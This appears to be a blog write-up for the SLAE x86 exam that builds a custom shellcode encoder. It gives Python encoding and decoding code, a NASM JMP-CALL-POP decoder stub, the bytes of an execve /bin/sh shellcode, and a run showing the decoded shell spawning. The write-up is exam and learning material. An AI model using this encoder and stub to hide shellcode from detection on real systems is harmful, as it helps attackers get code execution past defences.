---
title: "SLAE x86 Exam - Assignment #4"
date: 2021-12-21
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - exam
  - shellcode
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 4th assignment requires you to write a custom encoding scheme. The `PoC` ought to encode the `execve-stack` shellcode and execute it.

## Source Code

For this assignment, I uploaded the following files inside the folder [assignment_4](https://github.com/rbctee/SlaeExam/tree/main/code/assignment_4):

- [attempt_1/encoder.py](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_4/attempt_1/encoder.py): Python encoder using ROR/ROL-NOT-XOR instructions
- [attempt_1/decoder.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_4/attempt_1/decoder.nasm): Assembly decoder for the encoder above
- [attempt_2/encoder.py](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_4/attempt_2/encoder.py): Python encoder using ...
- [attempt_2/decoder.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_4/attempt_2/decoder.nasm)

## First attempt

### Encoding Scheme

I tried to think of an encoder that uses just a few mathematical operations and that's not too obvious like XOR encoders.

My implementation looks like this:

1. rotate:
    1. even-index bytes `ROT_EVEN` times using ROR (Right Rotation)
    2. odd-index bytes `ROT_ODD` times using ROL (Left Rotation)
2. invert (`NOT`) each byte
3. XOR each byte with the least significant byte of the length of the shellcode (`SHELL_CODE_LENGTH`, made up of 2 bytes)

The encoded shellcode (with the prepended auxiliary bytes) should look like this:

![Visual representation of the encoded shellcode](/assets/img/slae32/encoded_shellcode.png)
*Visual representation of the encoded shellcode*

### Python Encoder

Follows the python code that reads the shellcode stored inside `--input`, encodes it according to the previous scheme, and saves it into `--output`:

```py
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", help="File containing shellcode to encode", required=True)
    parser.add_argument("-o", "--output", help="Store the encoded shellcode in this file", required=False)

    args = parser.parse_args()
    input_file = args.input
    output_file = args.output

    shellcode = read_shellcode(input_file)
    encoded_shellcode = manage_shellcode_encoding(input_file, output_file)

    assert shellcode == manage_shellcode_decoding(encoded_shellcode)
```

{% sidenote After the shellcode is encoded, the program `asserts` whether the decoded version is correct %}

Follows the encoding function:

```py
def encode_shellcode(shellcode: bytes) -> bytes:
    encoded_shellcode = bytearray()
    print(f"[+] Original non-encoded shellcode (HEX): {shellcode.hex()}")

    shellcode_length_least_byte = len(shellcode) % 256
    shellcode_length_most_byte = len(shellcode) // 256

    ROT_EVEN, ROT_ODD = gen_random_rotations(ms_byte=shellcode_length_most_byte, ls_byte=shellcode_length_least_byte)
    shellcode_length_least_byte = shellcode_length_least_byte ^ ROT_EVEN
    shellcode_length_most_byte = shellcode_length_most_byte ^ ROT_ODD
```

{% sidenote The Least/Most Significant Bytes are XOR-ed with `ROT_EVEN`/`ROT_ODD` in order to avoid **null bytes**, e.g. shellcode of 256 bytes -> `0x0100` %}

```py
    print(f"[+] Rotations for even-index bytes: {ROT_EVEN} (hex: {hex(ROT_EVEN)})")
    print(f"[+] Rotations for odd-index bytes: {ROT_ODD} (hex: {hex(ROT_ODD)})")
    print(f"[+] Least Significant Byte of Shellcode Length XOR-ed with ROT_EVEN: {shellcode_length_least_byte} (hex: {hex(shellcode_length_least_byte)})")
    print(f"[+] Most Significant Byte of Shellcode Length XOR-ed with ROT_ODD: {shellcode_length_most_byte} (hex: {hex(shellcode_length_most_byte)})")

    encoded_shellcode.append(ROT_EVEN)
    encoded_shellcode.append(ROT_ODD)
    encoded_shellcode.append(shellcode_length_least_byte)
    encoded_shellcode.append(shellcode_length_most_byte)
```

{% sidenote Some auxialiary bytes are prepended to the encoded shellcode, in order for the decoder stub to decode it %}

```py
    print(f"[+] Helper bytes for decoding (HEX): {encoded_shellcode.hex()}")

    # 1. Rotate bytes
    #   1.1. EVEN index -> Rotate to the Right ROT_EVEN times
    #   1.2. ODD index -> Rotate to the Left ROT_ODD times
    # 2. NOT each byte
    # 3. XOR each byte with the Least Significant Byte of the shellcode length
    #   (shellcode_length_least_byte), which is XOR-ed with ROT_EVEN to avoid null_bytes
    print(f"\n[#] Encoding ...")

    for index, byte in enumerate(shellcode):
        if index % 2 == 0:
            # even index byte
            # print(f"[+] EVEN | Original byte: {hex(byte)}")

            encoded_byte = bitwise_ror(byte, ROT_EVEN, 8)
            # print(f"[+] EVEN | Rotated byte: {hex(encoded_byte)}")

            encoded_byte = bitwise_not(encoded_byte)
            # print(f"[+] EVEN | NOT-ed byte: {hex(encoded_byte)}")
```

{% sidenote ROR/ROL functions are taken from [Technological Masochism](https://www.falatic.com/index.php/108/python-and-bitwise-rotation)%}

```py
            if shellcode_length_least_byte != encoded_byte:
                encoded_byte ^= shellcode_length_least_byte
                # print(f"[+] EVEN | Xored byte: {hex(encoded_byte)}\n")
```

{% sidenote Avoid XOR-ing bytes equal to `shellcode_length_least_byte`, as it would result in `NULL` bytes %}

```py
        else:
            # odd index byte
            # print(f"[+] ODD | Original byte: {hex(byte)}")

            encoded_byte = bitwise_rol(byte, ROT_ODD, 8)
            # print(f"[+] ODD | Rotated byte: {hex(encoded_byte)}")

            encoded_byte = bitwise_not(encoded_byte)
            # print(f"[+] ODD | NOT-ed byte: {hex(encoded_byte)}")

            if shellcode_length_least_byte != encoded_byte:
                encoded_byte ^= shellcode_length_least_byte
                # print(f"[+] ODD | Xored byte: {hex(encoded_byte)}\n")
        
        encoded_shellcode.append(encoded_byte)
```

```py
    assert 0x00 not in encoded_shellcode
    return encoded_shellcode
```

{% sidenote The program fails if `NULL` bytes are present in the encoded shellcode %}

I ran the script multiple times with larger shellcodes, so I'm pretty sure (like ~98%) that the encoded shellcode won't contain `NULL` bytes.

The full script is stored on GitHub at [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_4/encoder.py).


### Python Decoder

Inside the previous `python` script I also implemented a function that decodes the encoded shellcode:

```py
def decode_shellcode(encoded_shellcode: bytes) -> bytes:
    decoded_shellcode = bytearray()

    ROT_EVEN, ROT_ODD = encoded_shellcode[:2]
    shellcode_length_least_byte = encoded_shellcode[2]
    shellcode_length_most_byte = encoded_shellcode[3]
    encoded_shellcode_main = encoded_shellcode[4:]
```

{% sidenote Extract the **auxiliary bytes** prepended to the encoded shellcode %}

```py
    print(f"\n[#] Decoding ...")
    for index, encoded_byte in enumerate(encoded_shellcode_main):

        if index % 2 == 0:
            if encoded_byte != shellcode_length_least_byte:
            	decoded_byte = encoded_byte ^ shellcode_length_least_byte
```

{% sidenote Check if the index is `odd`/`even`. Moreover, if the encoded byte is equal to the `Least Significant Byte` of the shellcode's length, then ignore it %}

```py
            else:
            	decoded_byte = encoded_byte

            decoded_byte = bitwise_not(decoded_byte)
            decoded_byte = bitwise_rol(decoded_byte, ROT_EVEN, 8)
        else:
            if encoded_byte != shellcode_length_least_byte:
            	decoded_byte = encoded_byte ^ shellcode_length_least_byte
            else:
            	decoded_byte = encoded_byte

            decoded_byte = bitwise_not(decoded_byte)
            decoded_byte = bitwise_ror(decoded_byte, ROT_ODD, 8)

        decoded_shellcode.append(decoded_byte)

    print(f"[+] Decoded shellcode (HEX): {decoded_shellcode.hex()}")
    return decoded_shellcode
```

For every byte of the encoded shellcode, the function does the following:

1. `XOR` each byte with the value of `shellcode_length_least_byte`, made exception for bytes equal to it
2. `NOT` each byte
3. Rotate bytes
  - if the index of the byte is `even`, then rotate to the left (`ROL`) `ROT_EVEN` times
  - if the index of the byte is `odd`, then rotate to the right (`ROR`) `ROT_ODD` times

Once you execute the script, it shows how to use it:

```bash
python3 encoder.py -h

# usage: encoder.py [-h] -i INPUT [-o OUTPUT]

# optional arguments:
#   -h, --help            show this help message and exit
#   -i INPUT, --input INPUT
#                         File containing shellcode to encode
#   -o OUTPUT, --output OUTPUT
#                         Store the encoded shellcode in this file
```

If you pass the correct arguments, in encodes your shellcode and *asserts* that it can be decoded correctly:

```bash
echo "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\xb0\x0b\x89\xe3\x8d\x4c\x24\x08\x8d\x54\x24\x08\xcd\x80" > shellcode.bin

python3 encoder.py -i ./shellcode.bin -o /tmp/encoded.binc

# [+] Non-encoded shellcode (HEX): 31c050686e2f7368682f2f6269b00b89e38d4c24088d542408cd800a
# [+] Non-encoded shellcode length: 28 bytes
# [+] Rotations for even-index bytes: 2 (hex: 0x2)
# [+] Rotations for odd-index bytes: 168 (hex: 0xa8)
# [+] Least Significant Byte of Shellcode Length XOR-ed with ROT_EVEN: 30 (hex: 0x1e)
# [+] Most Significant Byte of Shellcode Length XOR-ed with ROT_ODD: 168 (hex: 0xa8)
# [+] Helper bytes for decoding (HEX): 02a81ea8

# [#] Encoding ...
# [+] Encoded shellcode (HEX): 02a81ea8ad21f5897ace3d89fbce2a83bb512368196cf2c5e36cf4c5e32cc1eb
# [+] Encoded shellcode length: 32 bytes
# [+] Assembly data: 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb

# [#] Decoding ...
# [+] Decoded shellcode (HEX): 31c050686e2f7368682f2f6269b00b89e38d4c24088d542408cd800a
```

The line starting with **Assembly data:** contains the bytes you can copy-paste into the NASM skeleton file and use them with the `JMP-CALL-POP` technique:

```bash
# [+] Assembly data: 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb
```

### Assembly Decoder

First step is to prepare the skeleton of the decoder. I used the same shown in the `Episode 31` of the course, employed in conjunction with the `Insertion` encoder:

```nasm
; Author: Robert C. Raducioiu (rbct)

global _start

section .text

_start:

    xor ebx
    mul ebx

    jmp short CallShellcode

Shellcode:

    pop esi

Decode:

    ; ...

    jmp short Decode

CallShellcode:

    call Shellcode
    encoded: db 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb
```

As you can see, it is based on the famous `JMP-CALL-POP` technique in order to get a reference to the shellcode. I chose to use this because the other one I knew (pushing groups of `4` bytes on the stack) would increase the size of the shellcode.


Anyways, now the routine `Decode` must be implemented to decode the encoded shellcode. As mentioned previously, the first decoding operation is the following:

> 1. `XOR` each byte with the value of `shellcode_length_least_byte`, made exception for bytes equal to it

```nasm
_start:
    ; clear some registers for later use
    xor ebx, ebx
    mul ebx
    mov ecx, eax

    jmp short CallShellcode

Shellcode:

    ; get a reference to the encoded shellcode
    pop esi

    ; copy the address of the first encoded assembly instruction into EBX
    ;   +4 -> skip the first 4 auxiliary bytes 
    lea ebx, [esi+4]

    ; copy ROT_EVEN and ROT_ODD into AX
    ;   AL: ROT_EVEN
    ;   AH: ROT_ODD
    mov ax, WORD [esi]

    ; copy the XOR-ed length of the shellcode into CX
    ;   and XOR it again with ROT_EVEN:ROT_ODD to decode it
    mov cx, WORD [esi+2]
    xor cx, ax

    ; copy the length of the shellcode on the stack, for later use
    push ecx
```

{% sidenote Prepare registers before actually jumping to the `Decode` routine %}

```nasm
Decode:

    ; copy the length of the shellcode (previous 'push ecx') into DL
    ; and check if the two bytes are the same
    mov dl, [esp]
    cmp dl, BYTE [ebx]

    ; if they are equal jump to the next decoding operation: NOT
    je NotDecode

    ; if they aren't the equal, then XOR the byte with 'shellcode_length_least_byte'
    ;   which is the length of the shellcode XOR-ed with ROT_EVEN
    mov dl, [esi+2]
    xor BYTE [ebx], dl
```

{% sidenote Perform the 1st Decoding operation (`XOR`) or move to the next one, based on the commented condition %}

```nasm
CallShellcode:

    call Shellcode
    encoded: db 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb
```

Now that the 1st operation is done, it's time to move to the 2nd one:

```nasm
Decode:

    mov dl, [esp]
    cmp dl, BYTE [ebx]
    je NotDecode

    mov dl, [esi+2]
    xor BYTE [ebx], dl

NotDecode:

    not BYTE [ebx]
```

This one is very straightforward: based on the Decode routine I've already shown, if the current byte and the one known as `shellcode_length_least_byte` are equal, it jumps to `NoteDecode` in order to perform the `NOT` operation.

After that, the shellcode has to perform the 3d decoding operation:

> 3\. Rotate bytes
>  - if the index of the byte is `even`, then rotate to the left (`ROL`) `ROT_EVEN` times
>  - if the index of the byte is `odd`, then rotate to the right (`ROR`) `ROT_ODD` times

Follows the assembly code of interest:

```nasm
RotateBytes:

    ; save EBX before overwriting it
    push ebx

    ; check if the index is EVEN or ODD
    ; Math logic:
    ;   - EBX - ESI = 4 + current_byte_index
    ;   - if the Least Significant Bit is 1, then it is ODD
    ;   - use test to set the ZF flag if the index is ODD
    sub ebx, esi
    test bl, 1

    ; restore EBX and load the byte into DL
    pop ebx
    mov dl, BYTE [ebx]

    ; if the ZF flag is set, the index is ODD
    jnz RotateOdd
```

{% sidenote The shellcode checks if the index of the current byte is `ODD`/`EVEN`, then sets the `ZF` flag accordingly %}

```nasm
RotateEven:

    ; Rotate the byte ROT_EVEN times
    mov cl, al
    rol dl, cl
    jmp short AfterRotateByte

RotateOdd:

    ; rotate the byte ROT_ODD times
    mov cl, ah
    ror dl, cl
```

{% sidenote I wrote two different assembly routines, one to decode **even-indexed** bytes, and the other one to decode **odd-indexed** bytes %}

```nasm
AfterRotateByte:

    ; replace the original rotated byte with the decoded one
    mov BYTE [ebx], dl

    ; decrease the loop counter (size of the shellcode)
    dec WORD [esp]

    ; if the loop counter reaches 0, then jump to the decoded shellcode, skipping the auxiliary bytes
    jz encoded+4

    ; increase the offset of the next byte to be decoded, and jump to decode it
    inc ebx
    jmp short Decode
```

The full program can be found [here](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_4/attempt_1/decoder.nasm).

I used the following commandsd to confirm it works correctly:

```bash
rbct@slae:~$ vim decoder.nasm
rbct@slae:~$ nasm -f elf32 decoder.nasm
rbct@slae:~$ ld -N -o decoder decoder.o
rbct@slae:~$ ./decoder
$ whoami
rbct
$ id 
uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
$ exit
rbct@slae:~$
```

So it works, assignment completed right? Not quite, among the visible problems of the shellcode, its length is quite apparent. Considering the length of the original shellcode is `28` bytes, and the length of the full shellcode is `106` bytes, that means the decoding shellcode is `78` bytes long, which is like `3x` times the lengths of the original shellcode.
